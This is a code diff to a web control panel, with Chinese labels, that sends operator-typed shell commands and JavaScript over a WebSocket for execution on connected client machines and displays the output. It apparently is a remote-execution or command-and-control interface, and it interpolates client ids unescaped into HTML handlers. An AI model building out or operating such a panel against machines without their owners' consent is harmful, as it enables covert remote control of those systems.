@@ -99,6 +99,7 @@
         }
         ws.onmessage = (msg) => {
             const data = JSON.parse(msg.data);
+            console.log(data)
             if (data.type === "LOGIN_OK") {
                 document.getElementById("loginDiv").style.display = "none";
                 document.getElementById("mainDiv").style.display = "block";
@@ -165,14 +166,30 @@
             <button onclick="setClientWite('${c.clientId}')">设置WITE</button>
             <button onclick="setMode('${c.clientId}')">设置MODE</button>
             <button onclick="execCmd('${c.clientId}')">执行CMD</button>
-
+<button onclick="execJS('${c.clientId}')">执行JS</button>
         </td>
         `;
 
                     tbody.appendChild(tr);
                 });
             }
-
+            if (data.type === "CMD_RESULT") {
+                alert(
+                    `客户端: ${data.clientId}\n` +
+                    `命令: ${data.cmd}\n\n` +
+                    `STDOUT:\n${data.stdout}\n\n` +
+                    `STDERR:\n${data.stderr}\n` +
+                    `ExitCode: ${data.code}`
+                );
+            }
+            if (data.type === "JS_RESULT") {
+                alert(
+                    `客户端: ${data.clientId}\n` +
+                    `命令: ${data.code}\n\n` +
+                    `result:\n${data.result}\n\n` +
+                    `error:\n${data.error}\n`
+                );
+            }
         };
 
         function login() {
@@ -217,6 +234,16 @@
 
             ws.send(JSON.stringify({
                 type: "EXEC_CMD",
+                clientId,
+                cmd
+            }));
+        }
+        function execJS(clientId) {
+            const cmd = prompt("请输入要在客户端执行的JS命令：");
+            if (!cmd) return;
+
+            ws.send(JSON.stringify({
+                type: "EXEC_JS",
                 clientId,
                 cmd
             }));
